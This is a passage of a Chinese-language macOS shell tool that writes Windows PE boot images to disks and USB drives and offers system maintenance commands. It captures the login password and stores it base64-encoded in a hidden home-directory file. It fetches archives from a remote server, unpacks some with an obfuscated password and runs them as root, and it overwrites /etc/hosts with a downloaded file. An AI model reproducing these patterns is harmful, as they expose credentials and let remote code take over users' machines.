mv ~/Downloads/JG_Download/"$name" /private/tmp/pe.winclone/boot.img.gz	
echo "$pass" | sudo -S sudo /private/tmp/winclone.perl -restore -image_dir=/private/tmp/pe.winclone -ntfs_partition=${restore_device} -ntfstools_dir=/private/tmp -copy_bcd=/private/tmp/BCD -q	
mv /private/tmp/pe.winclone/boot.img.gz ~/Downloads/JG_Download/"$name"

clear && printf "\e[3J"
echo
echo
echo "本地PE系统写入完成！！！请通知技术员"

exit
fi

if [ "$winclone2222" ]; then
curl -# -C - --connect-timeout 10 -o /tmp/pe.zip "$ip5/pe.zip">/dev/null 2>&1
curl -# -C - --connect-timeout 10 -o /tmp/wl2.zip "$ip5/wl2.zip">/dev/null 2>&1
unzip -o "/tmp/pe.zip" -d "/tmp">/dev/null 2>&1
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/wl2.zip" -d "/tmp">/dev/null 2>&1

mv ~/Downloads/JG_Download/"$name" /private/tmp/pe.winclone/boot.img.gz	
echo "$pass" | sudo -S sudo /private/tmp/winclone.perl -restore -image_dir=/private/tmp/pe.winclone -ntfs_partition=${restore_device} -ntfstools_dir=/private/tmp -copy_bcd=/private/tmp/BCD -q	
mv /private/tmp/pe.winclone/boot.img.gz ~/Downloads/JG_Download/"$name"

clear && printf "\e[3J"
echo
echo
echo "本地PE系统写入完成！！！请通知技术员"
exit
fi




hdiutil attach ~/Downloads/JG_Download/"$name">/dev/null 2>&1

if [ ! -e /Volumes/11PE ]; then
if [ ! -e /Volumes/10PE ]; then
clear && printf "\e[3J"
echo
echo	
read -s -n1 -p "错误，无法加载映像！可能当前系统存在问题"
Start_menu
fi
fi


if [ "$winclone5" ]; then


/tmp/aria2c -c -o boot.zip $ip5/pewincloneee.zip -d /tmp
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/winclone" ]; then
echo
read -t 10 -p "安装工具无法下载，10秒后自动重试..."
BDPE
fi



/tmp/aria2c -c -o ntfs.zip $ip5/ntfs.zip -d /tmp
unzip -o "/tmp/ntfs.zip" -d "/tmp">/dev/null 2>&1
clear && printf "\e[3J"
if [ ! -f "/tmp/ntfs.zip" ]; then
read -t 10 -p "安装工具NTFS无法下载，10秒后自动重试..."
BDPE
fi
echo "$pass" | sudo -S sudo cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems






diskutil eraseVolume MS-DOS PEDOS ${restore_device}
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo /System/Library/Filesystems/fusefs_txantfs.fs/Support/mkntfs -Q -L BOOTCAMP ${restore_device}
echo "$pass" | sudo -S sudo rm -rf /System/Library/Filesystems/fusefs_txantfs.fs
diskutil mount ${restore_device}
if [ $? -ne 0 ] ; then
diskutil eraseVolume MS-DOS PEDOS ${restore_device}
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems
echo "$pass" | sudo -S sudo /System/Library/Filesystems/fusefs_txantfs.fs/Support/mkntfs -Q -L BOOTCAMP ${restore_device}
echo "$pass" | sudo -S sudo rm -rf /System/Library/Filesystems/fusefs_txantfs.fs
fi
mkdir /tmp/666
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
bootcamp_mounted="/tmp/666"
if [ -e /Volumes/10PE ]; then
echo "$pass" | sudo -S sudo cp -R /Volumes/10PE/* "${bootcamp_mounted}"
fi
if [ -e /Volumes/11PE ]; then
echo "$pass" | sudo -S sudo cp -R /Volumes/11PE/* "${bootcamp_mounted}"
fi
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo /tmp/ntfsclone -s ${restore_device} -o /tmp/boot.img
echo "$pass" | sudo -S sudo /tmp/pigz -6 -p 10 -k /tmp/boot.img
diskutil eraseVolume MS-DOS PEDOS ${restore_device}
echo "$pass" | sudo -S sudo /tmp/winclone5 --self-extract -p ${restore_device}

if [ ! -f "/Volumes/BOOTCAMP/boot/BCD" ]; then
read -t 30 -p "安装BCD失败，请检查NTFS软件，30秒后自动重试..."
BDPE
fi

clear && printf "\e[3J"
echo
echo
echo "\033[36m本地PE系统写入完成！！！\033[0m"
if [ "$ycmmaz" ]; then
osascript -e 'Tell application "System Events" to display dialog "本地PE写入完成，请通知技术员！" buttons {"OK"}'
fi
exit 0

fi







clear && printf "\e[3J"
echo "\033[36m正在写入PE系统进入硬盘...\033[0m"


#if [ "$T2XP" ] ; then
#/tmp/aria2c -c -s25 -x16 -m0 -o boot.zip --console-log-level=warn --summary-interval=888888888 $ip5/pewinclone.zip -d /tmp >/dev/null 2>&1
#unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
#if [ -e /Volumes/10PE ]; then
#echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /Volumes/10PE /tmp/Windows.wim
#fi
#if [ -e /Volumes/11PE ]; then
#echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /Volumes/11PE /tmp/Windows.wim
#fi
#if [ -e /Volumes/21PE ]; then
#echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /Volumes/21PE /tmp/Windows.wim
#fi
#echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -p ${restore_device} -i 1
#clear && printf "\e[3J"
#echo "\033[36m本地PE系统写入完成！！！\033[0m"
#if [ "$ycmmaz" ]; then
#osascript -e 'Tell application "System Events" to display dialog "本地PE写入完成，请通知技术员！" buttons {"OK"}'
#fi
#exit 0
#fi


if [ -e /Volumes/10PE ]; then
cp -R /Volumes/10PE/efi /Volumes/PEDOS
cp -R /Volumes/10PE/boot /Volumes/PEDOS
cp -R /Volumes/10PE/sources /Volumes/PEDOS
cp /Volumes/10PE/bootmgr /Volumes/PEDOS
cp /Volumes/10PE/bootmgr.efi /Volumes/PEDOS
diskutil eject /Volumes/10PE
umount -f /Volumes/10PE
diskutil eject $(diskutil list | grep '10PE' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
fi

if [ -e /Volumes/11PE ]; then
cp -R /Volumes/11PE/efi /Volumes/PEDOS
cp -R /Volumes/11PE/boot /Volumes/PEDOS
cp -R /Volumes/11PE/sources /Volumes/PEDOS
cp /Volumes/11PE/bootmgr /Volumes/PEDOS
cp /Volumes/11PE/bootmgr.efi /Volumes/PEDOS
diskutil eject /Volumes/11PE
umount -f /Volumes/11PE
diskutil eject $(diskutil list | grep '11PE' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
fi

if [ -e /Volumes/21PE ]; then
cp -R /Volumes/21PE/efi /Volumes/PEDOS
cp -R /Volumes/21PE/boot /Volumes/PEDOS
cp -R /Volumes/21PE/sources /Volumes/PEDOS
cp /Volumes/21PE/bootmgr /Volumes/PEDOS
cp /Volumes/21PE/bootmgr.efi /Volumes/PEDOS
diskutil eject /Volumes/21PE
umount -f /Volumes/21PE
diskutil eject $(diskutil list | grep '21PE' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
fi

if [ ! -f /Volumes/PEDOS/sources/boot.wim ]; then
clear && printf "\e[3J"
read -s -n1 -p "检测不到PE文件，任意键重新写入"
BDPE
fi


clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo
echo "\033[36m本地PE系统写入完成！！！\033[0m"
#open /Volumes/PEDOS
if [ "$ycmmaz" ]; then
osascript -e 'Tell application "System Events" to display dialog "本地PE写入完成，请通知技术员！" buttons {"OK"}'
fi
exit 0
}


UPPE(){
clear && printf "\e[3J"

updisk="$(diskutil list | grep external | sed 's/[^0-9]//g')"

if [ ! "$updisk" ]; then
updisk="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | head -n 1)"
olddisk="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g')"
updisksl1="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '1,1p')"
updisksl2="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '2,1p')"
updisksl3="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '3,1p')"
updisksl4="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '4,1p')"
updisksl5="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '5,1p')"
updisksl6="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '6,1p')"
if [ "$updisksl1" ]; then
echo
if [ "$updisksl2" ]; then
echo
if [[ "$updisksl1" = "${updisksl2:0:1}" ]]; then
echo
if [ "$updisksl3" ]; then
echo
if [[ "$updisksl1" = "${updisksl3:0:1}" ]]; then
echo
if [ "$updisksl4" ]; then
echo
if [[ "$updisksl1" = "${updisksl4:0:1}" ]]; then
echo
if [ "$updisksl5" ]; then
echo
if [[ "$updisksl1" = "${updisksl5:0:1}" ]]; then
echo
if [ "$updisksl6" ]; then
echo
if [[ "$updisksl1" = "${updisksl6:0:1}" ]]; then
echo
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
fi


fi


if [ "$updisk" ]; then
if [ $(echo "$updisk" | wc -l ) -gt 1 ]; then
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi

if [ ! "$updisk" ]; then
if [ ! "$olddisk" ]; then
echo
echo
read -s -n1 -p "检测不到U盘，请重新插上，请您按一下空格继续 ..."
UPPE
fi
fi

echo "$pass" | sudo -S sudo diskutil eraseDisk FAT32 UPPE MBRFormat disk"$updisk"

if [ $? -ne 0 ] ; then
echo "$pass" | sudo -S sudo diskutil eraseDisk FAT32 UPPE GPTFormat disk"$updisk"	
fi



if [ ! -e /Volumes/UPPE ]; then
killall "Disk Utility"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app 
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "请通知技术员，U盘未能格式化，请手动格式化后回车！"
UPPE
fi


hdiutil attach ~/Downloads/JG_Download/"$name"

clear && printf "\e[3J"
echo
echo
echo "\033[36m正在拷贝系统进入U盘...\033[0m"

if [ -e /Volumes/10PE ]; then
cp -R /Volumes/10PE/* /Volumes/UPPE
diskutil eject /Volumes/10PE
umount -f /Volumes/10PE
diskutil eject $(diskutil list | grep '10PE' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
fi

if [ -e /Volumes/11PE ]; then
cp -R /Volumes/11PE/* /Volumes/UPPE
diskutil eject /Volumes/11PE
umount -f /Volumes/11PE
diskutil eject $(diskutil list | grep '11PE' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
fi

if [ -e /Volumes/21PE ]; then
cp -R /Volumes/21PE/* /Volumes/UPPE
umount -f /Volumes/21PE
diskutil eject $(diskutil list | grep '21PE' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
fi


    
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo
echo "\033[36mU盘系统拷贝完成！！！\033[0m"
if [ "$ycmmaz" ]; then
osascript -e 'Tell application "System Events" to display dialog "U盘制作完成，请通知技术员！" buttons {"OK"}'
fi
exit 0
}


AZPKG(){
clear && printf "\e[3J"
if [ -f ~/abcd.sh ]; then
source ~/abcd.sh
if [ ! "$oldmm" ]; then
pass=$(echo $pass | base64 -D)
fi
fi
echo
if [ ! "$ycmmaz" ]; then
echo ID: "\033[36m${tbid}\033[0m"
fi
echo
if [ ! "$oldusb" ]; then
if [ ! "$pass" ]; then
pass="$(osascript -e 'set pass to text returned of (display dialog "请输入您当前苹果系统的开机密码:" default answer "" buttons {"OK"} default button 1 with hidden answer)')"
osascript <<EOD
activate application "Terminal"
EOD
password="$pass"
fi
if [ ! "$pass" ]; then
clear && printf "\e[3J"
echo
echo
read -t 3 -p "密码不能为空，请您先添加密码！

添加流程：

1.点【左上角苹果】
2.点【系统偏好设置】
3.点【用户和群组】
4.点【更改密码】

旧密码：
新密码：1234
验证：1234
提示：

5.点【更改密码】


特别说明：客户电脑本身无密码，客户自行设置密码，和本工具无任何关系！
"
AZPKG
fi
else
if [ "$oldmm" ]; then
echo
else
if [ ! "$pass" ]; then
pass="$(osascript -e 'Tell application "System Events" to display dialog "请输入您当前苹果系统的开机密码:" buttons {"OK"} default button 1 with hidden answer default answer ""' -e 'text returned of result')"
password="$pass"
fi
if [ ! "$pass" ]; then
clear && printf "\e[3J"
echo
echo
read -t 3 -p "密码不能为空，请先修改密码！

修改流程：

1.点【左上角苹果】
2.点【系统偏好设置】
3.点【用户和群组】
4.点【更改密码】

旧密码：
新密码：1234
验证：1234
提示：

5.点【更改密码】


特别说明：客户电脑本身无密码，客户自行设置密码，和本工具无任何关系！
"
AZPKG
fi
fi
fi
if [[ $modelxh != "10.4"* ]]; then
if [ ! "$pass" ]; then
unset password
prompt="开机密码==锁屏密码

【如果】输入错会要求您重新输入！

请输入您当前苹果系统开机的密码并回车[Enter]："
while IFS= read -p"$prompt" -r -s -n 1 char
do
    if [[ $char == $'\0' ]]
    then
        break
    fi
    prompt='*'
    password+="$char"
done
echo
pass="$password"
fi
if [ ! "$pass" ]; then
clear && printf "\e[3J"
echo
echo
read -t 3 -p "密码不能为空，请先修改密码！

修改流程：

1.点【左上角苹果】
2.点【系统偏好设置】
3.点【用户和群组】
4.点【更改密码】

旧密码：
新密码：1234
验证：1234
提示：

5.点【更改密码】


特别说明：客户电脑本身无密码，客户自行设置密码，和本工具无任何关系！
"
AZPKG
fi
else
if [ ! "$pass" ]; then
unset password
read -p "开机密码==锁屏密码

【如果】输入错会要求您重新输入！

请输入您当前苹果系统开机的密码并回车[Enter]：" password
pass="$password"
fi
if [ ! "$pass" ]; then
clear && printf "\e[3J"
echo
echo
read -t 3 -p "密码不能为空，请先修改密码！

修改流程：

1.点【左上角苹果】
2.点【系统偏好设置】
3.点【用户和群组】
4.点【更改密码】

旧密码：
新密码：1234
验证：1234
提示：

5.点【更改密码】


特别说明：客户电脑本身无密码，客户自行设置密码，和本工具无任何关系！
"
AZPKG
fi
fi
if [[ $password = "x" ]]; then
password=""
pass=""
Customize
fi
if [[ $password = "X" ]]; then
password=""
pass=""
Customize
fi
#if [[ $password = "w" ]]; then
#dscl . passwd $HOME "" 1234
#pass="1234"
#password="1234"
#fi
#if [[ $password = "W" ]]; then
#dscl . passwd $HOME "" 1234
#pass="1234"
#password="1234"
#fi
passwrd=`echo "$pass" | sudo -S sudo su`
if [ $? -eq 1 ] ; then
echo "密码错误重新输入"
pass=""
if [ -f ~/abcd.sh ]; then
rm -rf ~/abcd.sh
fi
if [[ $password = "root" ]]; then
if [ -f ~/abcd.sh ]; then
rm -rf ~/abcd.sh
fi
clear && printf "\e[3J"
echo 
echo "启用：备用模式"
moderoot="1"
password=""
pass=""
echo
echo
read -p "开机密码==锁屏密码

如果【输入错会弹出密码窗口】，请【取消】在【此窗口】重新输入密码

请输入您当前苹果系统开机的密码并回车[Enter]：" pass
osascript <<EOD
do shell script "" password "$pass" with administrator privileges
EOD
if [ $? -eq 1 ] ; then
password="root"
pass=""
AZPKG
fi
else
clear && printf "\e[3J"
echo
echo
read -t 2 -p "密码错误！！！"
AZPKG
fi
if [ ! "$moderoot" ]; then
AZPKG
fi
fi

if [ "$moderoot" ]; then
echo
else
if [ ! -f ~/abcd.sh ] ; then
echo "#!/bin/sh" > ~/abcd.sh
if [[ $modelxh != "10.6"* ]]; then
echo pass=$(echo $password | base64) >> ~/abcd.sh
fi
if [ "$oldmm" ]; then
echo pass=$password >> ~/abcd.sh
fi
chflags hidden ~/abcd.sh
fi
fi

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "pmset -a displaysleep 0 disksleep 0 sleep 0" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo pmset -a displaysleep 0 disksleep 0 sleep 0
fi

if [ "$ycmmaz" ]; then
kaishi2
fi

if [ "$xgiso" ]; then
Download
fi

if [ "$isoesd" ]; then
Download
fi

if [ "$fhxtlb" ] ;then
ZLDQ
fi

if [ "$zldqq" ] ;then
ZLDQ
fi

if [ "$HBFQS" ] ;then
HBFQ
fi

if [ "$jhpd" ] ;then
HBFQ
fi

if [ "$qmqdq" ] ;then
HBFQ
fi

if [ "$EFIS" ] ;then
HBFQ
fi

if [ "$SCXNJ" ] ;then
HBFQ
fi

if [ "$SCSIP" ] ;then
HBFQ
fi

if [ "$hfhost" ] ;then
HBFQ
fi

if [ "$cqpdfw" ] ;then
HBFQ
fi

if [ "$ydxf" ] ;then
HBFQ
fi

if [ "$wzbsjmac" ] ; then
Download
fi

if [ "$azmac" ] ;then
clear && printf "\e[3J"
echo
echo "磁盘空间：${Disk}"
echo
if [ "$azmac5g" ] ;then
read -p "自定义安装盘空间大小-默认【5G】回车:" size
size="5000000000"
else	
read -p "自定义安装盘空间大小-默认【15G】回车:" size
fi
case "$size" in
	x)
	Start_menu
	;;
esac
if [ ! "$size" ]; then
Download
fi
pdzm=$(echo "$size" | grep "[a-zA-Z]")
if [ "$pdzm" ]; then
AZPKG
fi
if [ "$azmac5g" ] ;then
if [ "$size" -lt 5 ]; then
echo
read -s -n1 -p "低于【5G】，按任意键继续..."
AZPKG
fi
else
if [ "$size" -lt 15 ]; then
echo
read -s -n1 -p "低于【15G】，按任意键继续..."
AZPKG
fi
fi
if [ ! "$tbky" ]; then
if [ "$size" -gt "$sjkykj" ]; then
echo
read -s -n1 -p "最大可以分"$sjkykj"G, 按任意键继续..."
AZPKG
fi
fi
size=$size"000000000"
fi

if [ "$azbdpe" ] ;then
clear && printf "\e[3J"
echo
echo "磁盘空间：${Disk}"
echo
read -p "自定义本地PE空间大小-默认【2G】回车:" size
case "$size" in
	x)
	Start_menu
	;;
esac
if [ ! "$size" ]; then
Download
fi
pdzm=$(echo "$size" | grep "[a-zA-Z]")
if [ "$pdzm" ]; then
AZPKG
fi
if [ "$size" -lt 1 ]; then
echo
read -s -n1 -p "低于【1G】，按任意键继续..."
AZPKG
fi
if [ ! "$tbky" ]; then
if [ "$size" -gt "$sjkykj" ]; then
echo
read -s -n1 -p "最大可以分"$sjkykj"G, 按任意键继续..."
AZPKG
fi
fi
size=$size"000000000"
fi

if [ "$HFSIP" ] ; then
HFSIP
fi

if [ "$ybpd" ] ; then
curl -# -C - --connect-timeout 10 -o /tmp/hosts.zip "$ip5/hosts.zip">/dev/null 2>&1
unzip -o "/tmp/hosts.zip" -d "/tmp">/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "chflags nouchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags -hv noschg /etc/hosts" password "$pass" with administrator privileges
do shell script "rm -rf /etc/hosts" password "$pass" with administrator privileges
do shell script "cp /tmp/hosts /etc" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo chflags nouchg /etc/hosts
echo "$pass" | sudo -S sudo chflags -hv noschg /etc/hosts
echo "$pass" | sudo -S sudo rm -rf /etc/hosts
echo "$pass" | sudo -S sudo cp /tmp/hosts /etc
fi
fi

if [ "$azqdq" ] ; then
M1Arm
fi

if [ "$azqdq2" ] ; then
M1Arm
fi

if [ "$azqdq3" ] ; then
M1Arm
fi





if [ "$uups" ]; then
curl -# -C - --connect-timeout 10 -o /tmp/hosts.zip "$ip5/hosts.zip">/dev/null 2>&1
unzip -o "/tmp/hosts.zip" -d "/tmp">/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "chflags nouchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags -hv noschg /etc/hosts" password "$pass" with administrator privileges
do shell script "rm -rf /etc/hosts" password "$pass" with administrator privileges
do shell script "cp /tmp/hosts /etc" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo chflags nouchg /etc/hosts
echo "$pass" | sudo -S sudo chflags -hv noschg /etc/hosts
echo "$pass" | sudo -S sudo rm -rf /etc/hosts
echo "$pass" | sudo -S sudo cp /tmp/hosts /etc
fi
Download
fi


if [ ! -f ~/Downloads/JG_Download/"$name" ]; then
Download
fi

if [ -f ~/Downloads/JG_Download/"$name".aria2 ]; then
Download
fi

if [ "$xnjaz" ] ; then
Download
fi

if [ "$azof" ] ; then
Download
fi

if [ "$azmac" ] ; then
BDMAC
fi	
				
if [ "$upazmac" ] ; then
UPMAC
fi

if [ "$azuppe" ] ; then
UPPE
fi	
		
if [ "$azbdpe" ] ; then
BDPE
fi

	
if [ "$oldsj" ]; then
hdiutil attach ~/Downloads/JG_Download/"$name"
if [ "${CustomizeURL}" = "sj10.10" ]; then
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/Install\ OS\ X/InstallMacOSX.pkg -target /
diskutil eject /Volumes/Install\ OS\ X
umount -f /Volumes/Install\ OS\ X
diskutil eject $(diskutil list | grep 'Install\ OS\ X' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
open /Applications/Install\ OS\ X\ Yosemite.app
fi
if [ "${CustomizeURL}" = "sj10.11" ]; then
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/Install\ OS\ X/InstallMacOSX.pkg -target /
diskutil eject /Volumes/Install\ OS\ X
umount -f /Volumes/Install\ OS\ X
diskutil eject $(diskutil list | grep 'Install\ OS\ X' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
open /Applications/Install\ OS\ X\ El\ Capitan.app
fi
if [ "${CustomizeURL}" = "sj10.12" ]; then
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /Volumes/Install\ macOS/InstallOS.pkg -target /
diskutil eject /Volumes/Install\ macOSInstall\ macOS
umount -f /Volumes/Install\ macOS
diskutil eject $(diskutil list | grep 'Install\ macOS' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
open /Applications/Install\ macOS\ Sierra.app
fi
fi


exit 0

}


ZLDQ(){
zldqq=""
jswj=""
kjboot="$(nvram manufacturing-enter-picker | grep "true")"
if [ "$kjboot" ]; then
kjboott="开"
else
kjboott="关"
fi
sykg="$(nvram SystemAudioVolume | grep "Error")"
if [ "$sykg" ]; then
sykgg="开"
else
sykg="$(nvram SystemAudioVolume | grep "%80")"
if [ "$sykg" ]; then
sykgg="关"
else
sykgg="开"
fi
fi
kgkj="$(nvram AutoBoot | grep "Error")"
if [ "$kgkj" ]; then
kgkjj="关"
else
kgkj="$(nvram AutoBoot | grep "%03")"
if [ "$kgkj" ]; then
kgkjj="开"
else
kgkjj="关"
fi
fi

if [[ $modelxh = "10.9"* ]]; then
sip=""
else

if [[ $modelxh = "10.8"* ]]; then
sip=""
else

if [[ $modelxh = "10.7"* ]]; then	
sip=""
else

if [[ $modelxh = "10.6"* ]]; then
sip=""

else

if [[ $modelxh = "10.5"* ]]; then
sip=""

else

if [[ $modelxh = "10.4"* ]]; then
sip=""

else

if [[ $modelxh = "10.10"* ]]; then
sip=""

else

if [[ $(csrutil status 2>/dev/null|awk '/status:/ {print $NF}') = *"disabled"* ]]; then
sip=""
else
sip="1"
if [[ $(csrutil status|grep "Apple Internal: disabled") = *"disabled"* ]]; then	
sip=""
else
sip="1"
fi
fi
fi
fi
fi
fi
fi
fi
fi
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
osascript <<EOD
tell application "Terminal"
activate
set size of window 1 to {800, 650}
end tell
EOD
echo "    _______________________        指令大全      ___________________"
echo "   |                        --------------------                    |"
echo "   |                                                                |"
echo "   |   \033[35m[R]\033[0m 重启并进入恢复模式     \033[35m[Y]\033[0m 强制关闭SIP                   |"
echo "   |                                                                |"
echo "   |   \033[35m[1]\033[0m 启用开机时显示选择系统     \033[35m[2]\033[0m 禁用     状态：$kjboott         |"
echo "   |                                                                |"
echo "   |   \033[35m[3]\033[0m 关闭开机声音     \033[35m[4]\033[0m 开启     状态：$sykgg                   |"
echo "   |                                                                |"
echo "   |   \033[35m[5]\033[0m 关闭开盖开机     \033[35m[6]\033[0m 开启     状态：$kgkjj                   |"
echo "   |                                                                |"
echo "   |   \033[35m[J]\033[0m 修复下载目录 [若正常请勿使用，会删除下载文件夹]          |"
echo "   |                                                                |"
echo "   |   \033[35m[P]\033[0m 删除PD虚拟机     \033[35m[V]\033[0m 删除VM虚拟机   [包括全部虚拟机系统] |"
echo "   |                                                                |"
echo "   |   \033[35m[H]\033[0m 删除并合并分区 [除苹果以外的全部分区包括Windows系统]     |"
echo "   |                                                                |"
echo "   |   \033[35m[S]\033[0m 删除恢复分区     \033[35m[E]\033[0m 修复EFI分区    \033[35m[QZ]\033[0m 强制删除文件    |"
echo "   |                                                                |"
echo "   |   \033[35m[C]\033[0m 重建恢复分区     \033[35m[K]\033[0m 开启签名工具   \033[35m[SC]\033[0m 删除指定分区    |"
echo "   |                                                                |"
echo "   |   \033[35m[G]\033[0m 升级EFI固件 [解决旧款电脑Windows显卡驱动黑屏]            |"
echo "   |                                                                |"
echo "   |   \033[35m[A]\033[0m 修复非root [解决系统存在为UID0的非root用户账户]          |"
echo "   |                                                                |"
echo "   |   \033[35m[Q]\033[0m 显示隐藏文件     \033[35m[W]\033[0m 关闭隐藏文件    \033[35m[YC]\033[0m 远程协助       |"
echo "   |                                                                |"
echo "   |   \033[35m[x]\033[0m 返回             \033[35m[N]\033[0m 重置NVRAM并重启                     |"
echo "   |                                                                |"
echo "   |________________________________________________________________|"
echo
read -p "_______请输入:" num
echo
case "$num" in
    a)
yhm="$(id -un)"    
yhm1="$(ls /users | awk '{print $1}' | sed -n '1,1p')"
yhm2="$(ls /users | awk '{print $1}' | sed -n '2,1p')"
yhm3="$(ls /users | awk '{print $1}' | sed -n '3,1p')"
yhm4="$(ls /users | awk '{print $1}' | sed -n '4,1p')"
yhm5="$(ls /users | awk '{print $1}' | sed -n '5,1p')"
if [ "$yhm1" ] ; then
if [ "$yhm1" != "$yhm" ] ; then
yhqx1="$(dscl . -list /Users UniqueID | grep $yhm1 | grep 501)"
if [ ! "$yhqx1" ] ; then
yhqx1="$(dscl . -list /Users UniqueID | grep $yhm1 | grep 502)"
fi
if [ ! "$yhqx1" ] ; then
yhqx1="$(dscl . -list /Users UniqueID | grep $yhm1 | grep 201)"
fi
if [ ! "$yhqx1" ] ; then
if [ "$yhm1" != "Shared" ] ; then
if [ "$yhm1" = "Guest" ] ; then
#echo "$pass" | sudo -S sudo dscl . create /Users/Guest uid 201
echo "$pass" | sudo -S sudo dscl . -delete /Users/Guest
else
echo "$pass" | sudo -S sudo dscl . create /Users/"$yhm1" uid 502
fi
fi
fi
fi
fi

if [ "$yhm2" ] ; then
if [ "$yhm2" != "$yhm" ] ; then
yhqx2="$(dscl . -list /Users UniqueID | grep $yhm2 | grep 501)"
if [ ! "$yhqx2" ] ; then
yhqx2="$(dscl . -list /Users UniqueID | grep $yhm2 | grep 502)"
fi
if [ ! "$yhqx2" ] ; then
yhqx2="$(dscl . -list /Users UniqueID | grep $yhm2 | grep 201)"
fi
if [ ! "$yhqx2" ] ; then
if [ "$yhm2" != "Shared" ] ; then
if [ "$yhm2" = "Guest" ] ; then
#echo "$pass" | sudo -S sudo dscl . create /Users/Guest uid 201
echo "$pass" | sudo -S sudo dscl . -delete /Users/Guest
else
echo "$pass" | sudo -S sudo dscl . create /Users/"$yhm2" uid 502
fi
fi
fi
fi
fi

if [ "$yhm3" ] ; then
if [ "$yhm3" != "$yhm" ] ; then
yhqx3="$(dscl . -list /Users UniqueID | grep $yhm3 | grep 501)"
if [ ! "$yhqx3" ] ; then
yhqx3="$(dscl . -list /Users UniqueID | grep $yhm3 | grep 502)"
fi
if [ ! "$yhqx3" ] ; then
yhqx3="$(dscl . -list /Users UniqueID | grep $yhm3 | grep 201)"
fi
if [ ! "$yhqx3" ] ; then
if [ "$yhm3" != "Shared" ] ; then
if [ "$yhm3" = "Guest" ] ; then
#echo "$pass" | sudo -S sudo dscl . create /Users/Guest uid 201
echo "$pass" | sudo -S sudo dscl . -delete /Users/Guest
else
echo "$pass" | sudo -S sudo dscl . create /Users/"$yhm3" uid 502
fi
fi
fi
fi
fi

if [ "$yhm4" ] ; then
if [ "$yhm4" != "$yhm" ] ; then
yhqx4="$(dscl . -list /Users UniqueID | grep $yhm4 | grep 501)"
if [ ! "$yhqx4" ] ; then
yhqx4="$(dscl . -list /Users UniqueID | grep $yhm4 | grep 502)"
fi
if [ ! "$yhqx4" ] ; then
yhqx4="$(dscl . -list /Users UniqueID | grep $yhm4 | grep 201)"
fi
if [ ! "$yhqx4" ] ; then
if [ "$yhm4" != "Shared" ] ; then
if [ "$yhm4" = "Guest" ] ; then
